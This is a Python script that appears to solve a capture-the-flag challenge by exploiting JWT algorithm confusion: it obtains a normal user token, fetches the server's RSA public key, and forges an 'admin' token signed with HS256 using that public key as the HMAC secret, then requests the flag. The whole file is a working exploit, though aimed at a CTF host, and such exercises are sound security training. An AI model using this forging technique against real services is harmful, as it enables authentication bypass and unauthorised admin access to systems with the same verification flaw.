import requests
import jwt
import json
import hmac
import hashlib
import base64

BASE_URL = "http://0448c08c3556.challs.ctf.r0devnull.team:8001"

def base64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=')

def get_valid_token():
    print("[*] Getting valid token for 'user'...")
    r = requests.post(f"{BASE_URL}/token/sign", json={"username": "user"})
    if r.status_code != 200:
        print(f"[-] Failed to get token: {r.text}")
        exit(1)
    token = r.json()["token"]
    print(f"[+] Got token: {token[:20]}...")
    return token

def get_public_key(token):
    print("[*] Getting public key...")
    cookies = {"token": token}
    r = requests.get(f"{BASE_URL}/api/getPublicKey", cookies=cookies)
    if r.status_code != 200:
        print(f"[-] Failed to get public key: {r.text}")
        exit(1)
    pubkey = r.json()["PUBKEY"]
    print("[+] Got public key")
    return pubkey

def forge_token(pubkey):
    print("[*] Forging admin token using HS256 and public key as secret...")
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"username": "admin"}
    
    header_b64 = base64url_encode(json.dumps(header, separators=(',', ':')).encode('utf-8'))
    payload_b64 = base64url_encode(json.dumps(payload, separators=(',', ':')).encode('utf-8'))
    
    msg = header_b64 + b'.' + payload_b64
    
    secret = pubkey.encode('utf-8')
    
    signature = hmac.new(secret, msg, hashlib.sha256).digest()
    signature_b64 = base64url_encode(signature)
    
    return (msg + b'.' + signature_b64).decode('utf-8')

def get_flag(token):
    print("[*] Attempting to get flag...")
    cookies = {"token": token}
    r = requests.get(f"{BASE_URL}/api/getFlag", cookies=cookies)
    if r.status_code != 200:
        print(f"[-] Failed to get flag: {r.text}")
        return
    print(f"[+] Response: {r.text}")

def main():
    valid_token = get_valid_token()
    pubkey = get_public_key(valid_token)
    forged_token = forge_token(pubkey)
    get_flag(forged_token)

if __name__ == "__main__":
    main()
